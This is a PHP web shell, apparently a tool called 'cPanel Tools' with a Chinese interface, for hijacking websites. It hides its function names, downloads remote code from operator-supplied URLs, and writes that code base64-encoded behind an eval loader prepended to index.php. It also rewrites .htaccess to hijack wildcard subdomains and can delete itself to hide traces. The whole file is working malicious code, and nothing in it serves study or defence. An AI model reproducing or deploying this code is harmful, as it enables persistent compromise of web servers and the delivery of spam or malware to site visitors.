<?php
$a=/*-0){KU^h<fDPV@%^;i-*/ "ra"./*-)nxuOvPkzyzUM.u+jT_-*/"ng"./*-=fr)q6N!8T$-*/"e";
$b=/*-QA>fArpYw;2]wx8wP-*/$a/*-Hpjo@SX|}3,zx(>}.-*/(/*-(2|#!No2(o!9%-*/"~",/*-g`l=#EPf4b0U!ET;-*/" ");
$c=$b[28].$b[29].$b[11].$b[25].$b[72].$b[74].$b[31].$b[26].$b[25].$b[27].$b[15].$b[26].$b[25];
$d=$b[28].$b[29].$b[11].$b[25].$b[72].$b[74].$b[31].$b[25].$b[16].$b[27].$b[15].$b[26].$b[25];
$e=$b[24].$b[21].$b[18].$b[25].$b[31].$b[23].$b[25].$b[10].$b[31].$b[27].$b[15].$b[16].$b[10].$b[25].$b[16].$b[10].$b[11];
$f=$b[24].$b[21].$b[18].$b[25].$b[31].$b[14].$b[9].$b[10].$b[31].$b[27].$b[15].$b[16].$b[10].$b[25].$b[16].$b[10].$b[11];
$action = isset($_GET['action'])? $_GET['action'] : '';
$path = isset($_POST['path']) ? $_POST['path'] : '.';
$root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'].'/' : '';
$is_wp = is_wp($root);if($is_wp == 1){$path = $root;}
$htaccess = $index = '';
if(file_exists($root."index.php")){
    $index = $e($root."index.php");
}elseif(file_exists($root."index.html")){
    $index = $e($root."index.html");
}
if(file_exists($root.".htaccess")){
    $htaccess = $e($root.".htaccess");
}
switch($action){
    case 'all':
        $title = '泛域名劫持';
        $content = '';
        $host = isset($_POST['host']) ? $_POST['host'] : '';
        $bb = isset($_POST['bb']) ? $_POST['bb'] : '';
        $domain = isset($_POST['domain']) ? $_POST['domain'] : '';
        if($host){
            $host = explode('|', $host);
            $bb = explode(PHP_EOL, $bb);
            $htaccess_root = '<IfModule mod_rewrite.c>'.PHP_EOL.'RewriteEngine on'.PHP_EOL;
            if(count($host) == count($bb)){
                for($i=0;$i<count($host);$i++){
                    if(!file_exists($root.$host[$i])){
                        mkdir($root.$host[$i]);
                    }
                    $code = getBbEnCode($bb[$i]).$index;
                    $f($root.$host[$i].'/index.php', $code);
                    $htaccess = "<IfModule mod_rewrite.c>".PHP_EOL."RewriteEngine On".PHP_EOL."RewriteBase /".$host[$i]."/".PHP_EOL."RewriteRule ^index.php$ - [L]".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-f".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-d".PHP_EOL."RewriteRule . index.php [L]".PHP_EOL."</IfModule>";
                    $f($root.$host[$i].'/.htaccess', $htaccess);
                    $htaccess_root .= 'RewriteCond %{HTTP_HOST} ^'.$host[$i].'.'.$domain.'$'.PHP_EOL.'RewriteCond %{REQUEST_URI} !^/'.$host[$i].'/'.PHP_EOL.'RewriteCond %{REQUEST_FILENAME} !-f'.PHP_EOL.'RewriteCond %{REQUEST_FILENAME} !-d'.PHP_EOL.'RewriteRule ^(.*)$ /'.$host[$i].'/$1'.PHP_EOL.'RewriteCond %{HTTP_HOST} ^'.$host[$i].'.'.$domain.'$'.PHP_EOL.'RewriteRule ^(/)?$ '.$host[$i].'/index.php [L]'.PHP_EOL.PHP_EOL;
                }
                $htaccess_root .= '</IfModule>';
                $f($root.'.htaccess', $htaccess_root);
                $content = '生成成功';
            }else{
                $content = '错误：主机名与劫持链接数量不一致。';
            }
        }else{
            $content = '<form name="frm1" id="frm1" method="post" action="?action=all"><table cellspacing="0" cellpadding="0" border="0" class="table"><tr><td align="center" width="120">域名</td><td><input class="form-input" type="text" name="domain" value="'.$_SERVER['HTTP_HOST'].'" placeholder="请输入域名，不带http:// , https:// 和 /。"></td></tr><tr><td align="center" width="120">主机名</td><td><input class="form-input" type="text" name="host" value="app|blog|cab|dec|emp|fanta|go|hello|inc|jason|ke|lm|mi|ni|oppo|po|qu|rs|super|tesla"></td></tr><tr><td align="center">劫持链接</td><td><textarea class="form-textarea" name="bb" placeholder="请输入对应的劫持链接，每行一条。"></textarea></td></tr><tr><td align="center"></td><td><input type="submit" class="form-button"></td></tr></table></form>';
        }        
    break;
    case 'b':
        $title = 'cPanel 加密劫持';
        $content = '';
        $htaccess_post = isset($_POST['htaccess']) ? $_POST['htaccess'] : '';
        $htaccess_post = $c($htaccess_post, true);
        $index_code = isset($_POST['index_code']) ? $_POST['index_code'] : '';
        $index_code = $c($index_code, true);
        $bb = isset($_POST['bb']) ? $_POST['bb'] : '';
        $bb = trim($c($bb, true));
        $bb2 = isset($_POST['bb2']) ? $_POST['bb2'] : '';
        $bb2 = trim($c($bb2, true));
        $fileName2 = isset($_POST['fileName2']) ? $_POST['fileName2'] : '';
        $bb3 = isset($_POST['bb3']) ? $_POST['bb3'] : '';
        $bb3 = trim($c($bb3, true));
        $fileName3 = isset($_POST['fileName3']) ? $_POST['fileName3'] : '';
        if($bb || $bb2 || $bb3){
            if($htaccess_post == ''){
                $htaccess_post = "<IfModule mod_rewrite.c>".PHP_EOL."RewriteEngine On".PHP_EOL."RewriteBase /".PHP_EOL."RewriteRule ^index.php$ - [L]".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-f".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-d".PHP_EOL."RewriteRule . index.php [L]".PHP_EOL."</IfModule>";
            }
            if(file_exists($root.".htaccess")){
                $temp = $e($root.".htaccess");
                if(md5($temp) != md5($htaccess_post)){
                    @chmod($root.".htaccess", 0755);
                    @unlink($root.".htaccess");
                    $result = $f($root.".htaccess", $htaccess_post);
                    if($result){
                        $temp = $e($root.".htaccess");
                        if(md5($temp) == md5($htaccess_post)){
                            $content .= ".htaccess 编辑成功。<br>";
                        }else{
                            $content .= ".htaccess 编辑失败。<br>";
                        }
                    }else{
                        $content .= ".htaccess 编辑失败。<br>";
                    }
                }else{
                    $content .= ".htaccess 正常。<br>";
                }
            }else{
                $result = $f($root.".htaccess", $htaccess_post);
                if($result){
                    $temp = $e($root.".htaccess");
                    if(md5($temp) == md5($htaccess_post)){
                        $content .= ".htaccess 生成成功。<br>";
                    }else{
                        $content .= ".htaccess 生成失败。<br>";
                    }
                }else{
                    $content .= ".htaccess 生成失败。<br>";
                }
            }
            $houzhui = '<?php $a=file_get_contents("'.$root.'zindex");$b=base64_decode($a, true);eval($b);?>';
            if($bb){
                $code = get($bb);
                $code = str_replace(array('<?php', '?>'), '', $code);
                if($code){
                    $f($root."zindex", $d($code));
                    $result = $f($root."index.php", $houzhui.$index_code);
                    if($result){
                        $content .= $bb." - index.php 劫持成功。<br>";
                    }else{
                        $content .= $bb." - index.php 劫持失败。<br>";
                    }
                }else{
                    $content .= $bb." - index.php 劫持失败。<br>";
                }
            }
            if($bb2 && $fileName2){
                $fileName2_txt = str_replace('.php', '.txt', $fileName2);
                $code2 = get($bb2);
                if($code2){
                    $code2 = str_replace(array('<?php', '?>'), '', $code2);
                    $f($root.$fileName2_txt, $d($code2));
                    $result = $f($root.$fileName2, str_replace('zindex', $fileName2_txt, $houzhui));
                    if($result){
                        $content .= $bb2." - ".$fileName2." 劫持成功。<br>";
                    }else{
                        $content .= $bb2." - ".$fileName2." <font color=\"red\">劫持生成失败。</font><br>";
                    }
                }else{
                    $content .= $bb2." - ".$fileName2." <font color=\"red\">劫持代码获取失败。</font><br>";
                }
            }
            if($bb3 && $fileName3){
                $fileName3_txt = str_replace('.php', '.txt', $fileName3);
                $code3 = get($bb3);
                if($code3){
                    $code3 = str_replace(array('<?php', '?>'), '', $code3);
                    $f($root.$fileName3_txt, $d($code3));
                    $result = $f($root.$fileName3, str_replace('zindex', $fileName3_txt, $houzhui));
                    if($result){
                        $content .= $bb3." - ".$fileName3." 劫持成功。<br>";
                    }else{
                        $content .= $bb3." - ".$fileName3." <font color=\"red\">劫持生成失败。</font><br>";
                    }
                }else{
                    $content .= $bb3." - ".$fileName3." <font color=\"red\">劫持代码获取失败。</font><br>";
                }
            }
        }
    break;
    case 'unlink':
        $title = '自毁程序';
        $status = unlink(__FILE__);
        if($status){
            $content = '自毁成功';
        }else{
            $content = '自毁失败';
        }
    break;
    default:
        $title = 'cPanel 加密劫持';
        $content = '<form action="?action=b" method="post" name="dsadsa"><div class="form-item form-text"><label class="form-label">.htaccess 原内容</label><div class="input-block"><textarea class="form-textarea" id="form_htaccess" name="htaccess">'.$htaccess.'</textarea></div></div><div class="form-item form-text"><label class="form-label">index 原内容</label><div class="input-block"><textarea class="form-textarea" name="index_code" id="text-index">'.htmlspecialchars($index).'</textarea></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持 - 1</label><div class="input-block"><input type="text" class="form-input" name="bb" id="form_bb" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持-2</label><div class="input-block"><input type="text" class="form-input" id="form_bb2" name="bb2" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label">文件名-2</label><div class="input-block"><input type="text" name="fileName2" placeholder="在这输入二级劫持文件名，例：xxx.php" class="form-input"></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持-3</label><div class="input-block"><input type="text" class="form-input" id="form_bb3" name="bb3" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label">文件名-3</label><div class="input-block"><input type="text" name="fileName3" placeholder="在这输入二级劫持文件名，例：xxx.php" class="form-input"></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none" onclick="postEnCode();"></div></div></form>';
    break;   
}?><!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>cPanel Tools</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
body{font-size:16px;color:#000;font-sans-serif: system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";line-height:28px;}a{text-decoration:none;}*{padding:0;margin:0;list-style:none;}.fa{padding-right:10px;}.submit{background-color:#1e9fff;vertical-align:middle;
    height: 38px;line-height: 38px;text-align:center;padding:0 18px;color:#FFF;border-radius:5px;cursor: pointer;}.border-none{border:none !important;}
#sidebarMenu{position:fixed;left:0;top:0;z-index:999;color:#fff;background-color:RGBA(33,37,41,var(--bs-bg-opacity,1));width:210px;padding:15px;height:100vh;}
#logo{color:#FFF;border-bottom:1px solid #888;padding-bottom:10px;width:100%;display:block;}
#logo span{font-size:24px;margin-left:10px;line-height:34px;vertical-align:middle;}
.nav{padding-top:10px;}
.nav-item{display:list-item;line-height:42px;}
.nav-item span{background-color:#0d6efd;border-radius:5px;display:block;padding-left:15px;}
.nav-item span a{color:#FFF;text-decoration:none;}
.nav-link{display:list-item;line-height:32px;padding:5px 0 5px 15px;color:#FFF;}
.nav-link:hover,.active{color:#ccffcc;font-weight:bold;}
main{position:absolute;left:240px;vertical-align:top;padding:20px;right:0;}
fieldset{display: block;margin-inline-start: 2px;margin-inline-end: 2px;padding-block-start: 0.35em;padding-inline-start: 0.75em;padding-inline-end: 0.75em;padding-block-end: 0.625em;min-inline-size: min-content;border-width: 2px;border-style: groove;border-color: rgb(192, 192, 192);border-image: initial;}
legend{display:block;padding-inline-start: 2px;padding-inline-end: 2px;border-width: initial;border-style: none;border-color: initial;border-image: initial;margin-left: 20px;
    padding:0 10px;font-size:20px;font-weight:300;}
.field-title{margin:27px 0 20px;border-width:0;border-top-width:1px;}
.table{border-collapse:collapse;border-spacing:0;overflow:scroll;width:100%;}
.table td{word-break:break-all;max-width:300px;background-color:#FFF;}
.table th, .table td{border: 1px solid #ddd;padding:8px;}
.table tbody > tr:hover{background-color:#ccffcc;}
.table tbody > tr:hover td{background:none;}
.form-item{margin-bottom:15px;clear:both;border:1px solid #eee;}
.form-button{display: inline-block;vertical-align: middle;height: 38px;line-height: 38px;border:1px solid transparent;padding: 0 18px;background-color: #009688;color: #fff;
    white-space: nowrap;text-align: center;font-size: 14px;border-radius: 2px;cursor: pointer;-moz-user-select: none;-webkit-user-select: none;-ms-user-select: none;}
.form-button:hover{opacity:.8;filter:alpha(opacity=80);color:#fff}
.form-label{position:relative;float:left;display:block;padding:9px 15px;width:80px;font-weight:400;line-height:20px;text-align:right;background-color:#fafafa;}
.form-text .form-label{float: none;width: 100%;border-radius: 2px;box-sizing: border-box;text-align: left;}
.input-block{position:relative;margin-left:110px;min-height:36px;}
.form-text .input-block{margin: 0;left: 0;top: -1px;}
.form-input{display:block;padding-left:10px;width:50%;height:38px;line-height:1.3;line-height:38px\9;border:none;}
.form-textarea{position:relative;width: 90%;min-height: 100px;height:auto;line-height:20px;border-radius: 0 0 2px 2px;padding: 6px 10px;resize: vertical;border: none;}
.form-radio{margin:12px 0 0 12px;}
.tab{display:none}
</style>
<script type="text/javascript">
function sa(form){for(var i=0;i<form.elements.length;i++){var e=form.elements[i];if(e.type == 'checkbox'){if(e.name != 'chkall'){e.checked = form.chkall.checked;}}}}
function del(){if(confirm("Are you sure?")){return true;}else{return false;}}
function tab(x){for(var i=1;i<3;i++){document.getElementById("tab_"+i).style.display='none';if(i==x){document.getElementById("tab_"+i).style.display='block';}}}
function Base64() { 
  // private property 
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="; 
  // public method for encoding 
  this.encode = function (input) { 
    var output = ""; 
    var chr1, chr2, chr3, enc1, enc2, enc3, enc4; 
    var i = 0; 
    input = _utf8_encode(input); 
    while (i < input.length) { 
      chr1 = input.charCodeAt(i++); 
      chr2 = input.charCodeAt(i++); 
      chr3 = input.charCodeAt(i++); 
      enc1 = chr1 >> 2; 
      enc2 = ((chr1 & 3) << 4) | (chr2 >> 4); 
      enc3 = ((chr2 & 15) << 2) | (chr3 >> 6); 
      enc4 = chr3 & 63; 
      if (isNaN(chr2)) { 
        enc3 = enc4 = 64; 
      } else if (isNaN(chr3)) { 
        enc4 = 64; 
      } 
      output = output + 
      _keyStr.charAt(enc1) + _keyStr.charAt(enc2) + 
      _keyStr.charAt(enc3) + _keyStr.charAt(enc4); 
    } 
    return output; 
  } 
  // public method for decoding 
  this.decode = function (input) { 
    var output = ""; 
    var chr1, chr2, chr3; 
    var enc1, enc2, enc3, enc4; 
    var i = 0; 
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, ""); 
    while (i < input.length) { 
      enc1 = _keyStr.indexOf(input.charAt(i++)); 
      enc2 = _keyStr.indexOf(input.charAt(i++)); 
      enc3 = _keyStr.indexOf(input.charAt(i++)); 
      enc4 = _keyStr.indexOf(input.charAt(i++)); 
      chr1 = (enc1 << 2) | (enc2 >> 4); 
      chr2 = ((enc2 & 15) << 4) | (enc3 >> 2); 
      chr3 = ((enc3 & 3) << 6) | enc4; 
      output = output + String.fromCharCode(chr1); 
      if (enc3 != 64) { 
        output = output + String.fromCharCode(chr2); 
      } 
      if (enc4 != 64) { 
        output = output + String.fromCharCode(chr3); 
      } 
    } 
    output = _utf8_decode(output); 
    return output; 
  } 
  // private method for UTF-8 encoding 
  _utf8_encode = function (string) { 
    string = string.replace(/\r\n/g,"\n"); 
    var utftext = ""; 
    for (var n = 0; n < string.length; n++) { 
      var c = string.charCodeAt(n); 
      if (c < 128) { 
        utftext += String.fromCharCode(c); 
      } else if((c > 127) && (c < 2048)) { 
        utftext += String.fromCharCode((c >> 6) | 192); 
        utftext += String.fromCharCode((c & 63) | 128); 
      } else { 
        utftext += String.fromCharCode((c >> 12) | 224); 
        utftext += String.fromCharCode(((c >> 6) & 63) | 128); 
        utftext += String.fromCharCode((c & 63) | 128); 
      } 
    } 
    return utftext; 
  }
}
function postEnCode(){
    var base = new Base64();
    document.getElementById("form_htaccess").value = base.encode(document.getElementById("form_htaccess").value);
    document.getElementById("text-index").value = base.encode(document.getElementById("text-index").value);
    document.getElementById("form_bb").value = base.encode(document.getElementById("form_bb").value);
    document.getElementById("form_bb2").value = base.encode(document.getElementById("form_bb2").value);
    document.getElementById("form_bb3").value = base.encode(document.getElementById("form_bb3").value);
}
</script>
</head>
<body>
<nav id="sidebarMenu">
    <a href="#" id="logo"><span><i class="fa fa-drupal"></i>cPanel Tools</span></a>
    <ul class="nav">
        <li class="nav-item">
            <span><i class="fa fa-optin-monster"></i>cPanel 专栏</span>
            <ul class="nav-toggle">
                <li><a href="?action=" class="nav-link<?php if($action == 'bb' || $action == '') echo ' active';?>"><i class="fa fa-user-secret"></i>加密劫持</a></li>
                <li><a href="?action=all" class="nav-link<?php if($action == 'all') echo ' active';?>"><i class="fa fa-bug"></i>泛域名劫持</a></li>
            </ul>
        </li>
        <li class="nav-item"><span><i class="fa fa-trash-o"></i><a href="?action=unlink">自毁程序</a></span></li>
    </ul>
</nav>
<main>
    <div class="container">
        <fieldset class="field-title">
            <legend><?php echo $title;?></legend>
        </fieldset>
        <?php echo $content;?>
    </div>
</main>
</body>
</html>
<?php
function is_wp($path){
    $i = 0;
    $file = array('wp-config.php','wp-login.php','wp-includes/version.php','wp-content/index.php','wp-admin/admin.php');
    foreach($file as $v){
        if(file_exists($path.$v)){
            $i++;
        }
    }
    if($i==5){
        return 1;
    }else{
        return 0;
    }
}

function get($url){
    $result = '';
    if(ini_get('allow_url_fopen')){
        $result = file_get_contents($url);
    }else{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    return $result;
}

function getBbEnCode($url){
    $code = get($url);
    $code = str_replace(array('<?php', '?>'), '', $code);
    $code = '<?php'.PHP_EOL.'$a=/*-0){KU^h<fDPV@%^;i-*/ "ra"./*-)nxuOvPkzyzUM.u+jT_-*/"ng"./*-=fr)q6N!8T$-*/"e";'.PHP_EOL.'$b=/*-QA>fArpYw;2]wx8wP-*/$a/*-Hpjo@SX|}3,zx(>}.-*/(/*-(2|#!No2(o!9%-*/"~",/*-g`l=#EPf4b0U!ET;-*/" ");'.PHP_EOL.'$c=$b[28].$b[29].$b[11].$b[25].$b[72].$b[74].$b[31].$b[26].$b[25].$b[27].$b[15].$b[26].$b[25];'.PHP_EOL.'$d=$b[27].$b[12].$b[25].$b[29].$b[10].$b[25].$b[31].$b[24].$b[9].$b[16].$b[27].$b[10].$b[21].$b[15].$b[16];'.PHP_EOL.'$e=$d($a,$c("'.$d($code).'",true));'.PHP_EOL.'$e();?>';
    return $code;
}
?>
